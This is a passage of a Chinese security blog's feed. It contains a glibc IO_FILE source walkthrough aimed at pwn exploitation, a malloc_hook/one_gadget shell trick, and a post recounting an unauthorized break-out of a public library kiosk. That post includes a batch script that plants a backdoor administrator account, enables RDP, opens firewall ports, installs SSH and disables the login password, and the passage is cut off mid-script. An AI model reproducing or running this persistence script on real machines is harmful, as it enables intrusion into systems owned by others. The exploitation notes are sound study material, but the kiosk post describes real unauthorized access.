fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0</span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回到_IO_new_file_xsputn中继续往后走，计算了buf是否为比较大的block（0x1000），如果是则直接调用new_do_write进行输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     /* Try to maintain alignment: write a whole number of blocks.  */</span><br><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</span><br><span class="line"></span><br><span class="line">     if (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  if (count &lt; do_write)</span><br><span class="line">    return n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后处理缓冲区剩余数据，将剩余数据输出至输出缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     /* Now write out the remainder.  Normally, this will fit in the</span><br><span class="line"> buffer, but it&apos;s somewhat messier for line-buffered files,</span><br><span class="line"> so we let _IO_default_xsputn handle the general case. */</span><br><span class="line">     if (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>关于这里只将数据输出到输出缓冲区而没有将其写至文件，其实是主函数会调用 _IO_flush_all_lockp()函数来清空缓冲区，该函数会在下面三种情况下被调用：</p><p>1：当 libc 执行 abort 流程时。</p><p>2：当执行 exit 函数时。当执行流从 main 函数返回时</p><p>3：当执行流从 main 函数返回时</p><h3 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h3><p>这里调用的是_IO_default_xsputn，跟进该函数，跳转到genops.c中的_IO_default_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Space available. */</span><br><span class="line">      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  if (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  if (count &gt; 20)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (count)</span><br><span class="line">    &#123;</span><br><span class="line">      char *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      ssize_t i;</span><br><span class="line">      for (i = count; --i &gt;= 0; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</span><br><span class="line">break;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里对剩余大小不同进行了分别处理，如果大于20则调用__memcpy,否则使用for循环直接赋值。最后如果输出缓冲区为0，则直接调用_IO_OVERFLOW输出，之后返回，这个流程基本就结束了。最后看下此时的fp，bcede…是data2中的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_ptr = 0x603494 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><h2 id="框架-3"><a href="#框架-3" class="headerlink" title="框架"></a>框架</h2><p>主要是对链接入_IO_list_all中的FILE结构体，还有fread，fwrite建立的输入输出缓冲区进行释放处理。</p><h2 id="细节-3"><a href="#细节-3" class="headerlink" title="细节"></a>细节</h2><h3 id="fclose-gt-IO-new-fclose"><a href="#fclose-gt-IO-new-fclose" class="headerlink" title="fclose-&gt;_IO_new_fclose"></a>fclose-&gt;_IO_new_fclose</h3><p>跟进fclose，进入了iofclose.c中的_IO_new_fclose函数，开始先对fp进行了检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHECK_FILE(fp, EOF);</span><br></pre></td></tr></table></figure></p><p>之后第一步：unlink，将fp从_IO_list_all中脱下。<br>这里需要注意下，在后面的利用中，为了能够直接调用_io_finish，会这里进行修改来绕过unlink与io_close</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  /* First unlink the stream.  */</span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><h4 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h4><p>跟进该函数，是位于genops.c中的_IO_un_link<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_un_link (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      if (_IO_list_all == NULL)</span><br><span class="line">;</span><br><span class="line">      else if (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      else</span><br><span class="line">for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  if (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure></p><p>可以看到，开始时先检查标志位_flags，之后判断_IO_list_all是否为空，不为空看是否在表头，若不再表头则遍历_IO_list_all单链表进行寻找。最后对其标志位_flags进行修改，该标志位表明了是否位于_IO_list_all链表中。</p><p>返回之后，调用_IO_file_close_it函数关闭释放缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br></pre></td></tr></table></figure><h4 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h4><p>跟进该函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  int write_status;</span><br><span class="line">  if (!_IO_file_is_open (fp))</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0</span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  else</span><br><span class="line">    write_status = 0;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0</span><br><span class="line">      ? _IO_SYSCLOSE (fp) : 0);</span><br><span class="line"></span><br><span class="line">  /* Free buffer. */</span><br><span class="line">  if (fp-&gt;_mode &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (_IO_have_wbackup (fp))</span><br><span class="line">_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, NULL, NULL, 0);</span><br><span class="line">      _IO_wsetg (fp, NULL, NULL, NULL);</span><br><span class="line">      _IO_wsetp (fp, NULL, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, NULL, NULL, 0);</span><br><span class="line">  _IO_setg (fp, NULL, NULL, NULL);</span><br><span class="line">  _IO_setp (fp, NULL, NULL);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = -1;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  return close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure></p><p>首先通过标志位_fileno 判断了文件是否打开，然后对其标志位进行了判断，目的是判断是否为输出缓冲区，是则调用_IO_do_flush刷新缓冲区。查看_IO_do_flush，发现是宏定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_do_flush(_f) \</span><br><span class="line">  ((_f)-&gt;_mode &lt;= 0      \</span><br><span class="line">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span><br><span class="line">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span><br><span class="line">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span><br><span class="line">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span><br><span class="line">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure></p><p>可以看到主要调用_IO_do_write将输出缓冲区输出。此时原先在输出缓冲区中的值才会被写入文件，所以一般程序运行中没有close的话打开文件可能会发现还没有写进去就是这个原因。再之后对_markers标志位进行了处理。然后可以看到后面调用了_IO_SYSCLOSE函数，看到是fileops.c中的_IO_file_close</p><h4 id="IO-SYSCLOSE-gt-IO-file-close"><a href="#IO-SYSCLOSE-gt-IO-file-close" class="headerlink" title="_IO_SYSCLOSE-&gt;_IO_file_close"></a>_IO_SYSCLOSE-&gt;_IO_file_close</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* Cancelling close should be avoided if possible since it leaves an</span><br><span class="line">     unrecoverable state behind.  */</span><br><span class="line">  return close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_close)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">看到主要调用了close_not_cancel，而它本身是个宏定义，</span><br></pre></td></tr></table></figure><p>#define close_not_cancel(fd) \<br>    __close (fd)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">实际就是通过系统调用__close关闭</span><br><span class="line"></span><br><span class="line">返回之后,调用_IO_setb/_IO_setg/_IO_setp，其中_IO_setb是设置结构体的buf指针， _IO_setg是设置read相关的指针，_IO_setp是设置write相关的指针</span><br></pre></td></tr></table></figure></p><p>  _IO_setb (fp, NULL, NULL, 0);<br>  _IO_setg (fp, NULL, NULL, NULL);<br>  _IO_setp (fp, NULL, NULL);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### _IO_setb</span><br><span class="line">进入_IO_setb，可以看到释放了缓冲区</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_setb (_IO_FILE <em>f, char </em>b, char *eb, int a)<br>{<br>  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    free (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  if (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  else<br>    f-&gt;_flags |= _IO_USER_BUF;<br>}<br>libc_hidden_def (_IO_setb)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">返回之后，再次调用了_IO_un_link</span><br></pre></td></tr></table></figure></p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);<br>  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;<br>  fp-&gt;_fileno = -1;<br>  fp-&gt;_offset = _IO_pos_BAD;</p><p>  return close_status ? close_status : write_status;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">返回到_IO_new_close函数，最后调用_IO_FINISH，进入到fileopsc.c中的_IO_new_file_finish</span><br><span class="line"></span><br><span class="line">#### _IO_FINISH-&gt;_IO_new_file_finish  </span><br><span class="line"></span><br><span class="line">看到先检查文件是否仍打开，如果打开就刷新缓冲区并关闭，不过之前已经关闭过了，这里会直接进入genops.c中的_IO_default_finish</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_new_file_finish (FILE *fp, int dummy)<br>{<br>  if (_IO_file_is_open (fp))<br>    {<br>      _IO_do_flush (fp);<br>      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))<br>    _IO_SYSCLOSE (fp);<br>    }<br>  _IO_default_finish (fp, 0);<br>}<br>libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### _IO_default_finish</span><br><span class="line">可以看到还是对缓冲区的释放，指针的释放等等</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_default_finish (FILE <em>fp, int dummy)<br>{<br>  struct _IO_marker </em>mark;<br>  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    {<br>      free (fp-&gt;_IO_buf_base);<br>      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = NULL;<br>    }</p><p>  for (mark = fp-&gt;_markers; mark != NULL; mark = mark-&gt;_next)<br>    mark-&gt;_sbuf = NULL;</p><p>  if (fp-&gt;_IO_save_base)<br>    {<br>      free (fp-&gt;_IO_save_base);<br>      fp-&gt;_IO_save_base = NULL;<br>    }</p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);</p><p>#ifdef _IO_MTSAFE_IO<br>  if (fp-&gt;_lock != NULL)<br>    _IO_lock_fini (*fp-&gt;_lock);</p><p>#endif<br>}<br>libc_hidden_def (_IO_default_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">最后返回后对fp指针进行了free，就结束了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2.24 check</span><br><span class="line"></span><br><span class="line">libc 2.24 之后专门添加了对虚表的检查，分别是/libio/libioP.h中的IO_validate_vtable 与 /libio/vtables.c中的_IO_vtable_check。</span><br><span class="line"></span><br><span class="line">所有的 libio vtables 被放进了专用的只读的 __libc_IO_vtables 段，以使它们在内存中连续。在任何间接跳转之前，vtable 指针将根据段边界进行检查，如果指针不在这个段，则调用函数 _IO_vtable_check() 做进一步的检查，并且在必要时终止进程。</span><br></pre></td></tr></table></figure></p><p>/<em> Perform vtable pointer validation.  If validation fails, terminate<br>   the process.  </em>/<br>static inline const struct _IO_jump_t <em><br>IO_validate_vtable (const struct _IO_jump_t </em>vtable)<br>{<br>  /<em> Fast path: The vtable pointer is within the __libc_IO_vtables<br>     section.  </em>/<br>  uintptr_t section_length = <strong>stop_</strong>libc_IO_vtables - <strong>start_</strong>libc_IO_vtables;<br>  uintptr_t ptr = (uintptr_t) vtable;<br>  uintptr_t offset = ptr - (uintptr_t) <strong>start_</strong>libc_IO_vtables;          </p><p>  /* 对vtable指针范围进行检查，不满足则调用_IO_vtable_check进行检查</p><p>  if (__glibc_unlikely (offset &gt;= section_length))<br>    /<em> The vtable pointer is not in the expected section.  Use the<br>       slow path, which will terminate the process if necessary.  </em>/<br>    _IO_vtable_check ();<br>  return vtable;<br>}</p><p>void attribute_hidden<br>_IO_vtable_check (void)<br>{</p><p>#ifdef SHARED<br>  /<em> Honor the compatibility flag.  </em>/<br>  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</p><p>#ifdef PTR_DEMANGLE<br>  PTR_DEMANGLE (flag);</p><p>#endif<br>  if (flag == &amp;_IO_vtable_check)<br>    return;</p><p>  /<em> In case this libc copy is in a non-default namespace, we always<br>     need to accept foreign vtables because there is always a<br>     possibility that FILE </em> objects are passed across the linking<br>     boundary.  <em>/<br>  {<br>    Dl_info di;<br>    struct link_map </em>l;<br>    if (!rtld_active ()<br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0<br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      return;<br>  }</p><p>#else /<em> !SHARED </em>/<br>  /<em> We cannot perform vtable validation in the static dlopen case<br>     because FILE </em> handles might be passed back and forth across the<br>     boundary.  Therefore, we disable checking in this case.  */<br>  if (__dlopen != NULL)<br>    return;</p><p>#endif</p><p>  __libc_fatal (“Fatal error: glibc detected an invalid stdio handle\n”);<br>}</p><p><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug s
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="io_file" scheme="http://siriuswhiter.tk/tags/io-file/"/>
    
  </entry>
  
  <entry>
    <title>Problem Solve Tricks</title>
    <link href="http://siriuswhiter.tk/2019/07/06/problem-solve-tricks/"/>
    <id>http://siriuswhiter.tk/2019/07/06/problem-solve-tricks/</id>
    <published>2019-07-06T03:42:41.000Z</published>
    <updated>2019-09-11T04:52:04.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-hook-amp-amp-one-gadget"><a href="#malloc-hook-amp-amp-one-gadget" class="headerlink" title="malloc_hook &amp;&amp; one_gadget"></a>malloc_hook &amp;&amp; one_gadget</h1><p>之前经常遇到one_gadget条件不满足使得最后覆盖malloc_hook之后无法getshell，前两天从ex师傅那里学到了一个好办法。</p><p>将one_gadget 填入realloc_hook处，然后malloc_hook处填上__libc_realloc处的地址，因为调用realloc时会先检测realloc_hook，所以仍然能够调用one_gadget，为了能够满足one_gadget的条件（一般是对栈内存有要求），可以通过realloc代码开始处的寄存器push操作来进行栈帧调整，使得条件满足来getshell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;malloc-hook-amp-amp-one-gadget&quot;&gt;&lt;a href=&quot;#malloc-hook-amp-amp-one-gadget&quot; class=&quot;headerlink&quot; title=&quot;malloc_hook &amp;amp;&amp;amp; one_gadge
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>终端渗透记录-lib</title>
    <link href="http://siriuswhiter.tk/2019/06/15/%E7%BB%88%E7%AB%AF%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-lib/"/>
    <id>http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/</id>
    <published>2019-06-15T02:39:25.000Z</published>
    <updated>2019-07-30T11:00:23.882Z</updated>
    
    <content type="html"><![CDATA[<p><em>前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来</em></p><p>上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来</p><p>一般触控的主机，长按是相当于鼠标右键的点击的，在主页上打开右键，发现里面有全局设置</p><p>再打开全局设置的话，看到了有关于flash插件播放器的问题，看样子是需要联网的，点击链接会调出浏览器，同时出现的还有加速球hhh，get！</p><p>后面在尝试调用右键的时候经常会半天出不来，这时可以进到关于简介的地方，随便把一句话括起来，就会出现复制打印之类的选项</p><p>选择打印会弹出小框，而且也会弹出加速球，有了加速球其实就好解决了</p><p>加速器本身很难点进去，长按也没啥反应，但是加速球带着网络速度的检查，而在网速检查中，有推荐你清理垃圾的选项hhh</p><p>点击清理垃圾就能够把电脑管家给召唤出来。</p><p>为了能够更方便的操作，先将电脑中的teamviewer升级（ps:神奇的是之前确实是有下好的），但是没法打开，或者是打开也看不到</p><p>类似于是看报的界面是置顶的，在电脑管家中找找还有什么好用的软件，之前在浏览器里下载的搜狗输入法直接被删了，或许是有检测</p><p>但是看样子teamviewer之前就是用电脑管家下的，或许这里的不会被删掉，为了后面更加方便，这里下载了搜狗输入法（ps:不用问没有输入法怎么下的，毕竟榜单前列）</p><p>在看电脑管家工具箱时看到了桌面整理和小Q桌面hhh，尝试使用桌面整理，下载安装完之后，突然出现了桌面hhh</p><p>想打开我的电脑，但是打开就被直接关闭了，后台应该是有应用在监控文件管理器的打开（其实想看有啥东西还是挺简单的，浏览器查看本机文档完全无障碍），想开任务管理器，软键盘欲罢不能</p><p>后面一通操作之后，桌面又出不来了（哭），就勉强使用小Q桌面一用，打开之前升级的teamviewer，电子邮箱不能输入（暴哭）</p><p>到这一步感觉没办法的时候，索性重装一下teamviewer，bingo，远程连接ok了hhh</p><p>不过这样子实在是不安全，万一到时候拿着teamviewer账号找上门就尴尬了，好在先teamviewer控制，后面带电脑过去操控就比较方便了。</p><p>目前的想法，为了能够更方便地控制还不被被监控端看到，完全可以传一个远控码过去，因为没有能绕过监控的码（菜），不过应该是可以用teamviewer放到白名单然后开机自启动吧hhh。</p><p>没有码只能建个新的管理员权限的用户然后开通ssh服务远程连接使用，为了方便流程写了个bat脚本,隐藏用户的方法没建成功，就在最后设置成开机不要求密码来解决每天自动开机后卡在登陆界面的问题（主要是为了方便操作，没有能够隐蔽操作，打开文件之类的都是拿teamviewer提前传好的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">net user administratore admin /add</span><br><span class="line">net user administratore /active:yes</span><br><span class="line">net user administratore /expires:never</span><br><span class="line">net localgroup Administrators administratore /add</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start C:\Users\Administrator\Library\setupssh-8.0p1-2.exe </span><br><span class="line">pause</span><br><span class="line">cd C:\openSSH\bin</span><br><span class="line">mkgroup -l &gt;&gt; ..\etc\group</span><br><span class="line">mkpasswd -l &gt;&gt; ..\etc\passwd</span><br><span class="line">md 